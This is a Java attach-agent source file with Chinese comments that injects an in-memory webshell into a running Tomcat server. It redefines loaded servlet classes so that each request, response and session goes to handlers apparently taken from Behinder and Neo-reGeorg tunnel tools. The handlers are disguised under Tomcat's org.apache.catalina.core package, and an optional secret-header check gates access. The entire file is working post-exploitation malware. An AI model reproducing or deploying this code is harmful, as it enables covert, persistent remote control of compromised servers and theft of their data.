package indi.augusttheodor;

import com.sun.tools.attach.AgentInitializationException;
import com.sun.tools.attach.AgentLoadException;

import org.apache.catalina.core.ExtendServices;
import org.apache.catalina.core.NeoServices;
import org.apache.catalina.core.RebeyondServices;
import java.io.IOException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.util.HashMap;

public class AgenstMain {

    public static void main(String[] args){
        //SB VSCODE 天天 吞我编码
        //我的注释！
        try{
            String edit="";
            for(String a:args){
                edit+=a;
                edit+="\n";
            }
            AttachA.doAttach(edit);
        } catch (AgentLoadException | IOException | AgentInitializationException e) {
            throw new RuntimeException(e);  //不打算处理但依然写了
        }

    }

    public static void agentmain(String agentArgs, Instrumentation ins) throws Exception {
        //这个方法作为agent时的入口 谁重载
       Options cmd=new Options(agentArgs);
        if(cmd.hasOption("u")){
            //修改代理
            ExtendServices.SERVICE_URL=cmd.getOptionValue("u")+"E";
            RebeyondServices.SERVICE_URL=cmd.getOptionValue("u")+"R";
            NeoServices.SERVICE_URL=cmd.getOptionValue("u")+"N";
        }
        if(cmd.hasOption("uR")){
            //使用的时候别为难自己了大哥们
            RebeyondServices.SERVICE_URL=cmd.getOptionValue("uR");
        }
        if(cmd.hasOption("uN")){
            NeoServices.SERVICE_URL=cmd.getOptionValue("uN");
        }
        if(cmd.hasOption("uE")){
            ExtendServices.SERVICE_URL=cmd.getOptionValue("uE");
        }
        String sc="boolean scFlag=true;"; //添加的校验环节
        if(cmd.hasOption("a")){
            System.out.println(cmd.getOptionValue("a"));
            String[] authKey= cmd.getOptionValue("a").split(":");
            sc="boolean scFlag=request.getHeader(\""+authKey[0]+"\")==null?\""+authKey[1]+"\"==null : request.getHeader(\""+authKey[0]+"\").equals(\""+authKey[1]+"\");";
        }
        TransformerA.init();
        HashMap<String, String[]> hm = AttachA.findAttachClasses(); //懒得写注释了，要怪请怪VSCODE
        Class[] classes = ins.getAllLoadedClasses();
        //枚举所有已加载类，然后检查我们的注入器中是否包含这些
        for (Class c : classes) {
            if (hm.containsKey(c.getName())) {
                //如果包含呢，那就使用Transformer对其字节码进行注入
                for(String mN : hm.get(c.getName())){ //遍历列表取出所有要注入的方法
                    TransformerA tA = new TransformerA(mN,c.getName());
                    tA.setSourceCode("{" +
                            "javax.servlet.http.HttpServletRequest request=(javax.servlet.http.HttpServletRequest)$1;\n" +
                            "javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)$2;\n" +
                            sc +
                            "System.out.println(scFlag);" +
                            "if(scFlag==true){" +
                            "   java.util.Map rdd=new java.util.HashMap();\n" +
                            "   rdd.put(\"url\",request.getServletPath());\n" +
                            "   rdd.put(\"method\",request.getMethod());\n" +
                            "   rdd.put(\"b\",request.getReader().readLine());\n" +
                            "   java.util.Map s=new java.util.HashMap();\n" +
                            "   s.put(\"request\",request);\n" +
                            "   s.put(\"response\",response);\n" +
                            "   s.put(\"session\",request.getSession());" +
                            "   org.apache.catalina.core.RebeyondServices.doServices(rdd,s);" +
                            "   org.apache.catalina.core.ExtendServices.doServices(rdd,s);" +
                          //"   org.apache.catalina.core.Suo5Services.doServices(rdd,s);" + //启用此功能需要重新编译，请看Suo5Services
                            "   org.apache.catalina.core.NeoServices.doServices(rdd,s);" +
                            "   }" +
                            "}"); //前置，在被注入环境内获取所有需要的内容，然后进入agent环境
                    try {
                        ClassDefinition cd=new ClassDefinition(c, tA.getBytes(c));
                        ins.redefineClasses(cd);
                    } catch (UnmodifiableClassException e) {
                        System.out.println(mN+"------"+c.getName()+"------"+"不可注入！");
                    } catch (ClassNotFoundException e) {
                        throw new RuntimeException(e);
                    }
                }

            }
        }
    }

}